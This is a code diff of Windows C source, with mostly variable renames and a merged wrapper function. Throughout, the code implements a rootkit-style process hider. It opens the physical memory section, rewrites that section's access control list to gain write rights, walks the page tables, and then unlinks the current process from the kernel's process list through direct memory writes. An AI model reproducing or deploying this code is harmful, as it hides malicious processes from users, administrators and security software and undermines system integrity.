@@ -1,7 +1,6 @@
 #include <windows.h>
 #include <Accctrl.h>
 #include <Aclapi.h>
-#include <windows.h>
 #pragma comment(lib,"advapi32.lib")
 #define NT_SUCCESS(Status)((NTSTATUS)(Status) >= 0)
 #define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
@@ -36,22 +35,22 @@ typedef NTSTATUS (CALLBACK* ZWOPENSECTION)( OUT PHANDLE SectionHandle, IN ACCESS
 typedef VOID (CALLBACK* RTLINITUNICODESTRING)(IN OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString);
 RTLINITUNICODESTRING RtlInitUnicodeString;
 ZWOPENSECTION ZwOpenSection;
-HMODULE g_hNtDLL = NULL;
-PVOID g_pMapPhysicalMemory = NULL;
-HANDLE g_hMPM = NULL;
+HMODULE hNtdll = NULL;
+PVOID pMapPhysMem = NULL;
+HANDLE hMPM = NULL;
 OSVERSIONINFO g_osvi;
 BOOL InitNTDLL(){
-    g_hNtDLL = LoadLibrary("ntdll.dll");
-    if (NULL == g_hNtDLL)
+    hNtdll = LoadLibrary("ntdll.dll");
+    if (NULL == hNtdll)
         return FALSE;
-    RtlInitUnicodeString = (RTLINITUNICODESTRING)GetProcAddress( g_hNtDLL, "RtlInitUnicodeString");
-    ZwOpenSection = (ZWOPENSECTION)GetProcAddress( g_hNtDLL, "ZwOpenSection");
+    RtlInitUnicodeString = (RTLINITUNICODESTRING)GetProcAddress( hNtdll, "RtlInitUnicodeString");
+    ZwOpenSection = (ZWOPENSECTION)GetProcAddress( hNtdll, "ZwOpenSection");
     return TRUE;
 }
 VOID CloseNTDLL(){
-    if(NULL != g_hNtDLL)
-        FreeLibrary(g_hNtDLL);
-    g_hNtDLL = NULL;
+    if(NULL != hNtdll)
+        FreeLibrary(hNtdll);
+    hNtdll = NULL;
 }
 VOID SetPhyscialMemorySectionCanBeWrited(HANDLE hSection){ 
     PACL pDacl = NULL; 
@@ -113,19 +112,19 @@ HANDLE OpenPhysicalMemory(){
     attributes.Attributes                = 0;
     attributes.SecurityDescriptor        = NULL;
     attributes.SecurityQualityOfService    = NULL;
-    status = ZwOpenSection(&g_hMPM, SECTION_MAP_READ|SECTION_MAP_WRITE, &attributes); 
+    status = ZwOpenSection(&hMPM, SECTION_MAP_READ|SECTION_MAP_WRITE, &attributes); 
     if(status == STATUS_ACCESS_DENIED){ 
-        status = ZwOpenSection(&g_hMPM, READ_CONTROL|WRITE_DAC, &attributes); 
-        SetPhyscialMemorySectionCanBeWrited(g_hMPM); 
-        CloseHandle(g_hMPM);
-        status = ZwOpenSection(&g_hMPM, SECTION_MAP_READ|SECTION_MAP_WRITE, &attributes); 
+        status = ZwOpenSection(&hMPM, READ_CONTROL|WRITE_DAC, &attributes); 
+        SetPhyscialMemorySectionCanBeWrited(hMPM); 
+        CloseHandle(hMPM);
+        status = ZwOpenSection(&hMPM, SECTION_MAP_READ|SECTION_MAP_WRITE, &attributes); 
     }
     if(!NT_SUCCESS(status)) 
         return NULL;
-    g_pMapPhysicalMemory = MapViewOfFile(g_hMPM, FILE_MAP_READ|FILE_MAP_WRITE, 0, PhyDirectory, 0x1000);
-    if( g_pMapPhysicalMemory == NULL )
+    pMapPhysMem = MapViewOfFile(hMPM, FILE_MAP_READ|FILE_MAP_WRITE, 0, PhyDirectory, 0x1000);
+    if( pMapPhysMem == NULL )
         return NULL;
-    return g_hMPM;
+    return hMPM;
 }
 PVOID LinearToPhys(PULONG BaseAddress, PVOID addr){
     ULONG VAddr = (ULONG)addr,PGDE,PTE,PAddr;
@@ -136,7 +135,7 @@ PVOID LinearToPhys(PULONG BaseAddress, PVOID addr){
     if (0 != tmp){
         PAddr = (PGDE & 0xFFC00000) + (VAddr & 0x003FFFFF);
     }else{
-        PGDE = (ULONG)MapViewOfFile(g_hMPM, 4, 0, PGDE & 0xfffff000, 0x1000);
+        PGDE = (ULONG)MapViewOfFile(hMPM, 4, 0, PGDE & 0xfffff000, 0x1000);
         PTE = ((PULONG)PGDE)[(VAddr&0x003FF000)>>12];
         if (0 == (PTE&1))
             return 0;
@@ -146,8 +145,8 @@ PVOID LinearToPhys(PULONG BaseAddress, PVOID addr){
     return (PVOID)PAddr;
 }
 ULONG GetData(PVOID addr){
-    ULONG phys = (ULONG)LinearToPhys((PULONG)g_pMapPhysicalMemory, (PVOID)addr);
-    PULONG tmp = (PULONG)MapViewOfFile(g_hMPM, FILE_MAP_READ|FILE_MAP_WRITE, 0, phys & 0xfffff000, 0x1000);
+    ULONG phys = (ULONG)LinearToPhys((PULONG)pMapPhysMem, (PVOID)addr);
+    PULONG tmp = (PULONG)MapViewOfFile(hMPM, FILE_MAP_READ|FILE_MAP_WRITE, 0, phys & 0xfffff000, 0x1000);
     if (0 == tmp)
         return 0;
     ULONG ret = tmp[(phys & 0xFFF)>>2];
@@ -155,8 +154,8 @@ ULONG GetData(PVOID addr){
     return ret;
 }
 BOOL SetData(PVOID addr,ULONG data){
-    ULONG phys = (ULONG)LinearToPhys((PULONG)g_pMapPhysicalMemory, (PVOID)addr);
-    PULONG tmp = (PULONG)MapViewOfFile(g_hMPM, FILE_MAP_WRITE, 0, phys & 0xfffff000, 0x1000);
+    ULONG phys = (ULONG)LinearToPhys((PULONG)pMapPhysMem, (PVOID)addr);
+    PULONG tmp = (PULONG)MapViewOfFile(hMPM, FILE_MAP_WRITE, 0, phys & 0xfffff000, 0x1000);
     if (0 == tmp)
         return FALSE;
     tmp[(phys & 0xFFF)>>2] = data;
@@ -167,7 +166,7 @@ long __stdcall exeception(struct _EXCEPTION_POINTERS *tmp){
    ExitProcess(0);
    return 1 ;
 }
-BOOL HideProcessEx(){
+BOOL HideProcess(){
     if (FALSE == InitNTDLL())
         return FALSE;
     if (0 == OpenPhysicalMemory())
@@ -185,18 +184,7 @@ BOOL HideProcessEx(){
     }
     SetData((PVOID)(fw + 4), bw);
     SetData((PVOID)(bw), fw);
-    CloseHandle(g_hMPM);
+    CloseHandle(hMPM);
     CloseNTDLL();
     return TRUE;
 }
-
-BOOL HideProcess(){
-	static BOOL b_hide = FALSE;
-	if (!b_hide) {
-		b_hide = TRUE;
-		HideProcessEx();
-		return TRUE;
-	}
-	return TRUE;
-}
-
